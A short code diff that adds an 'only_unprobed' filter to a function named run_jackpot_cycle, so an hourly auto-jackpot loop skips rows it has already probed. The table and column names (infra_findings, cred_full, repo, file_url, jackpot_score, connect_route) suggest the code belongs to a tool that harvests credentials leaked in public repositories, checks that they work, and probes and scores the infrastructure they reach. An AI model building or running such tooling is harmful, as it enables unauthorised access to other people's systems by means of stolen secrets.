@@ -1707,9 +1707,14 @@ def _dedup_host_key(cred_type: str, cred: str) -> str:
     return f"{cred_type}:{cred[:32]}"
 
 
-async def run_jackpot_cycle(limit: int | None = None) -> dict:
-    """Probe every is_validated=1 row in infra_findings. Updates jackpot_data,
+async def run_jackpot_cycle(limit: int | None = None,
+                              only_unprobed: bool = False) -> dict:
+    """Probe is_validated=1 rows in infra_findings. Updates jackpot_data,
     jackpot_score, connect_route columns. Returns aggregate counts.
+
+    only_unprobed=True restricts to rows that don't have jackpot_data yet
+    (used by the auto-jackpot loop in main.py to avoid re-probing already-
+    investigated infra each hour).
 
     Adds:
       • Per-host dedup — multiple validated rows pointing at the same
@@ -1729,6 +1734,8 @@ async def run_jackpot_cycle(limit: int | None = None) -> dict:
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
     where = "is_validated=1"
+    if only_unprobed:
+        where += " AND (jackpot_data IS NULL OR jackpot_data='')"
     rows = conn.execute(
         f"SELECT id, cred_type, cred_full, repo, file_url, file_path,"
         f" repo_stars, repo_created"
